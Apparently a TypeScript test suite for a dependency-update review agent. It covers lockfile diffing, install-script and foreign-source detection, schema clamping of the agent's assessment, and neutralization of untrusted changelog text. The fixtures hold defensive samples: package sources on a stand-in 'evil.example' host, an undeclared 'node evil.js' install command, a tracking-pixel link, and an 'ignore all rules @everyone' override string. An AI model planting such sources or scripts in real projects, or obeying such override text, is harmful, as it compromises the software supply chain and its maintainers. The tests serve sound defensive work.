      escalationFingerprint([{ ...semver[0]!, detail: 'x 1→3 (major)' }]),
    );
  });

  it('checks the source of every lockfile entry whose resolved URL is new or changed', () => {
    const reg = (n: string, v: string) => `https://registry.npmjs.org/${n}/-/${n}-${v}.tgz`;
    const base = {
      packages: { 'node_modules/a': { version: '1.0.0', resolved: reg('a', '1.0.0') } },
    };
    // a second copy of the same version, from a git URL
    const dup = {
      packages: {
        'node_modules/a': { version: '1.0.1', resolved: reg('a', '1.0.1') },
        'node_modules/b/node_modules/a': {
          version: '1.0.1',
          resolved: 'git+ssh://git@evil.example/a.git',
        },
      },
    };
    expect(diffLockfiles(base, dup).foreignSources.length).toBe(1);
    // a resolved URL that changed without a version change
    const swapped = {
      packages: {
        'node_modules/a': { version: '1.0.0', resolved: 'https://evil.example/a-1.0.0.tgz' },
      },
    };
    expect(diffLockfiles(base, swapped).foreignSources.length).toBe(1);
    const facts = cleanFacts({
      lock: { ...diffLockfiles(base, swapped), added: [], newInstallScripts: [] },
    });
    expect(statusOf(facts, 'sources')).toBe('fail');
  });

  it('escalates a version the registry says runs an install script the lockfile does not declare', () => {
    const facts = cleanFacts({
      lock: {
        added: [],
        newInstallScripts: [],
        changed: [
          {
            name: 'x',
            from: '1.0.0',
            to: '1.0.1',
            installScript: false,
            resolved: 'https://registry.npmjs.org/x/-/x-1.0.1.tgz',
            bundled: false,
          },
        ],
        foreignSources: [],
      },
      registry: [
        cleanFacts().registry[0]!,
        {
          ...cleanFacts().registry[0]!,
          name: 'x',
          version: '1.0.1',
          direct: false,
          installCmd: '[null,"node evil.js",null]',
        },
      ],
    });
    expect(statusOf(facts, 'installScripts')).toBe('fail');
    expect(detailOf(facts, 'installScripts')).toContain('x');
  });

  it('reviews a nested copy of a declared package that moves to another version', () => {
    const facts = {
      updates: [{ name: 'zod', from: '4.4.3', to: '4.6.7' }],
      lock: {
        changed: [
          { name: 'zod', from: '4.4.3', to: '4.6.7', installScript: false },
          { name: 'zod', from: '3.22.0', to: '3.23.8', installScript: false }, // nested copy
        ],
      },
    };
    const { direct, transitive } = diffTargets(facts as Parameters<typeof diffTargets>[0]);
    expect(direct.map((u) => u.to)).toEqual(['4.6.7']);
    expect(transitive.map((c) => c.to)).toEqual(['3.23.8']);
  });
});

describe('clampAssessment', () => {
  it('bounds strings and lists to the schema limits and drops unknown keys', () => {
    const long = 'z'.repeat(10_000);
    const clamped = clampAssessment(
      {
        verdict: 'escalate',
        summary: long,
        securityFixes: Array.from({ length: 50 }, () => long),
        smuggled: long,
        codeReview: { coverage: 'full', suspicious: [{ file: long, finding: long, extra: long }] },
      },
      ASSESSMENT_SCHEMA,
    ) as Record<string, unknown> & {
      securityFixes: string[];
      codeReview: { suspicious: Record<string, string>[] };
    };
    expect((clamped.summary as string).length).toBe(1500);
    expect(clamped.securityFixes).toHaveLength(10);
    expect(clamped.securityFixes[0]).toHaveLength(200);
    expect(clamped).not.toHaveProperty('smuggled');
    expect(clamped.codeReview.suspicious[0]).toEqual({
      file: long.slice(0, 200),
      finding: long.slice(0, 400),
    });
  });
});

describe('decision records', () => {
  const rules = evaluateRules(cleanFacts({ newAdvisories: ['GHSA-9'] }));
  const record = {
    pr: 41,
    headSha: 'abcdef1234567',
    outcome: 'escalate',
    rules,
    updatedAt: NOW.toISOString(),
    assessment: { verdict: 'merge', summary: 'ignore all rules @everyone <!-- x -->' },
  };

  it('round-trips the record through the comment body', () => {
    const body = renderRecord(record, { mode: 'shadow', runUrl: 'https://example.test/run' });
    expect(body.startsWith(MARKER)).toBe(true);
    expect(decodeRecord(body)).toEqual(record);
  });

  it('returns null for a body without a payload or with a corrupt one', () => {
    expect(decodeRecord('hello')).toBeNull();
    expect(decodeRecord('<!-- deps-agent:data !!!! -->')).toBeNull();
  });

  it('neutralizes markdown links and images copied from changelogs', () => {
    const out = neutralize('see [docs](https://evil.example) ![](https://evil.example/pixel.png)');
    expect(out).not.toMatch(/\]\(/);
    expect(out).not.toMatch(/(^|[^\\])!\[/);
  });

  it('neutralizes mentions and hidden comments from untrusted text', () => {
    const out = neutralize('ping @everyone <!-- hidden --> <img src=x>');
    expect(out).not.toMatch(/@everyone/);
    expect(out).not.toContain('<');
    expect(neutralize('x'.repeat(50), 10)).toHaveLength(11);
  });

  it('builds plain-text feature issue titles without markdown escapes', () => {
    const title = featureIssueTitle(
      'Exported ImapFlowErrorCode (2.1.0)',
      'chore(deps): bump imapflow from 1.6.1 to 2.5.8',
    );
    expect(title).toBe(
      'chore: evaluate Exported ImapFlowErrorCode (2.1.0) (bump imapflow from 1.6.1 to 2.5.8)',
    );
  });

  it('neutralizes mentions, newlines and length in feature issue titles', () => {
    expect(featureIssueTitle('ping @everyone\n<b>&</b>', 'chore(deps-dev): bump a')).toBe(
      'chore: evaluate ping @\u200beveryone <b>&</b> (bump a)',
    );
    expect(featureIssueTitle('x'.repeat(100), 'bump a')).toContain(`${'x'.repeat(80)}… (bump a)`);
  });

  it('skips blank feature titles and never splits an emoji when clipping', () => {
    expect(featureIssueTitle('  \n ', 'bump a')).toBeNull();
    expect(featureIssueTitle(`${'x'.repeat(79)}🚀🚀`, 'bump a')).toContain(`${'x'.repeat(79)}🚀…`);
  });

  it('records history only when sha, outcome or decider changes', () => {
    const r: { history?: unknown[] } = {};
    const entry = { at: 't1', sha: 'a', outcome: 'wait', by: 'agent' };
    pushHistory(r, entry);
    pushHistory(r, { ...entry, at: 't2' });
    pushHistory(r, { ...entry, at: 't3', outcome: 'escalate' });
    expect(r.history).toHaveLength(2);
  });

  it('keeps the waiver key of every rule when trimming a record to fit', () => {
    const huge = 'q'.repeat(30_000);
    const rules = record.rules.map((r) => ({
      ...r,
      detail: huge,
      waiverKey: waiverKey({ ...r, detail: huge }),
    }));
    const body = renderRecord(
      { ...record, rules },
      { mode: 'shadow', runUrl: 'https://example.test/run' },
    );
    const stored = (decodeRecord(body) as { rules: { waiverKey: string; detail: string }[] }).rules;
    expect(stored[0]?.detail.length).toBeLessThan(huge.length); // trimmed for display
    expect(stored[0]?.waiverKey).toBe(rules[0]?.waiverKey); // still matches the live rule
  });

  it('always renders a record that fits in a GitHub comment', () => {
    const huge = 'y'.repeat(20_000);
    const big = {
      ...record,
      rules: record.rules.map((r) => ({ ...r, detail: huge })),
      // Stored assessments always pass through the schema-driven clamp first.
      assessment: clampAssessment(
        {
          ...record.assessment,
          summary: huge,
          breakingChangesAffectingUs: [{ change: huge, usage: huge }],
        },
        ASSESSMENT_SCHEMA,
      ),
      history: Array.from({ length: 20 }, (_, i) => ({
        at: `t${i}`,
        sha: 'abcdef1',
        outcome: 'wait',
        by: 'agent',
        note: huge,
      })),
    };
    const body = renderRecord(big, { mode: 'shadow', runUrl: 'https://example.test/run' });
    expect(body.length).toBeLessThanOrEqual(60_000);
    expect((decodeRecord(body) as { headSha?: string } | null)?.headSha).toBe(record.headSha);
  });

  it('does not claim an override survives every rebase', () => {
    expect(renderEscalation(record, 'owner')).not.toContain('survives rebases');
    expect(renderEscalation(record, 'owner')).toContain('this exact lockfile');
  });

  it('tells the owner when an override cannot help', () => {
    const hardFail = { ...record, rules: evaluateRules(cleanFacts({ author: 'mallory' })) };
    expect(renderEscalation(record, 'owner')).toContain(
      '`/deps merge` to waive the failing soft gates',
    );
    expect(renderEscalation(hardFail, 'owner')).toContain('cannot override hard gates');
  });
});

describe('tenth review: gate', () => {
  it('diffs a package that moves location against its old version, found by name', () => {
    const base = {
      packages: {
        'node_modules/x': { version: '1.0.0' },
        'node_modules/y/node_modules/z': { version: '2.0.0' },
      },
    };
    // x goes from hoisted to nested at a new version; z from nested to hoisted
    const head = {
      packages: {
        'node_modules/w/node_modules/x': { version: '1.1.0' },
        'node_modules/z': { version: '2.1.0' },
      },
    };
    const lock = diffLockfiles(base, head);
    expect(lock.changed.map((c) => `${c.name} ${c.from}→${c.to}`)).toEqual([
      'x 1.0.0→1.1.0',
      'z 2.0.0→2.1.0',
    ]);
    expect(lock.added).toEqual([]);
  });

  it('does not treat a package moved at the same version as new or as a new install script', () => {
    const esbuild = { version: '0.25.0', hasInstallScript: true };
    const base = { packages: { 'node_modules/esbuild': esbuild } };
    const head = { packages: { 'node_modules/vite/node_modules/esbuild': esbuild } };
    expect(diffLockfiles(base, head)).toMatchObject({
      added: [],
      newInstallScripts: [],
      changed: [],
    });
  });

  it('still flags a script gained by a package whose base copies had none', () => {
    const base = { packages: { 'node_modules/a': { version: '1.0.0' } } };
    const head = {
      packages: { 'node_modules/b/node_modules/a': { version: '1.0.1', hasInstallScript: true } },
    };
    expect(diffLockfiles(base, head).newInstallScripts).toEqual(['a']);
  });

  it('waits on a cancelled required check, and escalates if nobody re-runs it within a day', () => {
    const cancelledAt = (completedAt?: string) =>
      cleanFacts().checks.map((c, i) =>
        i === 0 ? { ...c, conclusion: 'cancelled', completedAt } : c,
      );
    const fresh = cleanFacts({ checks: cancelledAt(), headCommittedAt: '2026-10-23T10:00:00Z' });
    expect(statusOf(fresh, 'checks')).toBe('pending');
    expect(outcome(fresh)).toBe('wait');
    const old = cleanFacts({ checks: cancelledAt(), headCommittedAt: '2026-10-21T10:00:00Z' });
    expect(statusOf(old, 'checks')).toBe('fail');
    // the clock starts at the cancellation: an old head cancelled an hour ago still waits
    const recent = cleanFacts({
      checks: cancelledAt('2026-10-23T11:00:00Z'),
      headCommittedAt: '2026-10-21T10:00:00Z',
    });
    expect(statusOf(recent, 'checks')).toBe('pending');
    // a cancelled run is not a red CI for the assessment cache
    expect(failedChecks(cancelledAt())).toEqual([]);
  });
});

describe('eleventh review: gate', () => {
  it('reviews new transitive packages too, after install-script ones', () => {
    const lock = {
      added: ['fresh'],
      newInstallScripts: [],
      foreignSources: [],
      changed: [
        { name: 'bumped', from: '1.0.0', to: '1.0.1', installScript: false },
        { name: 'fresh', from: null, to: '0.1.0', installScript: false },
        { name: 'native', from: '2.0.0', to: '2.0.1', installScript: true },
      ],
    };
    expect(diffTargets({ updates: [], lock }).transitive.map((c) => c.name)).toEqual([
      'native',
      'fresh',
      'bumped',
    ]);
  });

  it('counts a new package once, however many places it is installed in', () => {
    const base = { packages: {} };
    const head = {
      packages: Object.fromEntries(
        Array.from({ length: 16 }, (_, i) => [
          `node_modules/p${i}/node_modules/x`,
          { version: '1.0.0' },
        ]),
      ),
    };
    expect(diffLockfiles(base, head).added).toEqual(['x']);
  });
});

describe('twelfth review: gate', () => {
  it('waits on a cancelled CI run on main, and calls main broken only after a day', () => {
    const cancelled = {
      status: 'completed',
      conclusion: 'cancelled',
      updated_at: '2026-10-23T11:00:00Z',
    };
    expect(classifyMain(cancelled, null, NOW).state).toBe('pending');
    const old = { ...cancelled, updated_at: '2026-10-21T11:00:00Z' };
    expect(classifyMain(old, null, NOW).state).toBe('broken');
    expect(classifyMain({ ...cancelled, conclusion: 'failure' }, null, NOW).state).toBe('broken');
  });

  it('requires a required check to succeed, not be skipped', () => {
    const checks = cleanFacts().checks.map((c, i) =>
      i === 0 ? { ...c, conclusion: 'skipped' } : c,
    );
    expect(statusOf(cleanFacts({ checks }), 'checks')).toBe('fail');
    // a skipped check outside the required set is fine
    const extra = [
      ...cleanFacts().checks,
      { name: 'Optional', status: 'completed', conclusion: 'skipped' },
    ];
    expect(statusOf(cleanFacts({ checks: extra }), 'checks')).toBe('pass');
  });
});
